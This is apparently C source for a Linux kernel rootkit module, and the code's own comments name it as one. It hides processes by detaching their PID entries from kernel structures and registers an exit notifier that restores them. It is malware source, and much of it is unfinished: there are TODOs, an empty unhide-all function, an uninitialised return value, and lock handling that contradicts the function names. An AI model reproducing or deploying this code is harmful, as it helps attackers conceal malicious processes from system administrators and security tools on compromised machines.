#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>
#include <linux/kernel.h>

#include "common.h"
#include "processHider.h"
#include "readdirHijack.h"
#include "processHiderPidManipulation.h"
#include "HiddenProcessCollection.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif


static HiddenProcessCollection collection = NULL;

// Function Prototypes
static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber);
static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore);
//


struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunctionOnTaskExit,
	.next = NULL,// TODO: CHECK THIS
	.priority = INT_MAX, // if there are multiple tasks registered for exit notifications it is desirable that the rootkit is called first so that it can restore the task.
};

//TODO: move this higher in the file
int processHider_init(void) {
	// this will fail if profiling is disabled
	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		return error;
	}

	collection = createHiddenProcessCollection();
	if (collection == NULL) {
		return -1;
	}

	return 0;
}

static void unhideAllHiddenTasksGivenLockIsHeld(void) {
	//TODO: write this
}

void processHider_exit(void) {
	// perhaps kill hidden processes / require that the tasks are dead first..

	//TODO: check that a race condition does not exist when exiting e.g. if a process exits at the same time

	int error;
	rcu_read_lock();

	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);

	unhideAllHiddenTasksGivenLockIsHeld();

	rcu_read_unlock();
}



//returns error code...
//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
int hideProcess(int pidNumber) {
	int result;
	
	if (isHiddenProcessCollectionFull(collection)) {
		printError("Failed to hide process. Too may processes are hidden.\n");
		result = -1;
	} else {
		struct restorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);

		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		if (hiddenTask.task == NULL) {
			result = -1;
			printError("failed to hide task\n");
		} else {
			addHiddenProcessToCollection(collection, hiddenTask);
		}

		rcu_read_unlock();
	}
	
	return result;
}

int showProcess(int pid) {
	rcu_read_lock();

	if (isPidInCollection(collection, pid)) {
		struct restorableHiddenTask restorableHiddenTask = removePidFromCollection(collection, pid);
		restoreTaskGivenRcuLockIsHeld(restorableHiddenTask);
	}

	rcu_read_unlock();
	return 0;
}

static struct restorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
	struct restorableHiddenTask result = {
		.task = task,
		.originalPid = originalPid,
		.pidNumber = pidNumber,
	};
	return result;
}

static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
	struct task_struct *task;
	struct pid *originalPid;
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...

	if (pid == NULL) {
		return createRestorableTask(NULL, NULL, -1); 	//TODO: improve ability to return failure
	}


	task = pid_task(pid, PIDTYPE_PID);

	if (task != NULL) {
		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
	} else {
		originalPid = NULL;
	}

	return createRestorableTask(task, originalPid, pidNumber);
}

static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	//printInfo("in notification function for exit - task is %p\n", task);

	if (isTaskInCollection(collection, task)) {
		struct restorableHiddenTask entry = removeTaskFromCollection(collection, task);
		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		restoreTaskGivenRcuLockIsHeld(entry);

		rcu_read_unlock();
	}

	return 0;
}

static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore) {
	printInfo("Unhiding task\n");
	attach_pid(taskToRestore.task, PIDTYPE_PID, taskToRestore.originalPid);
}


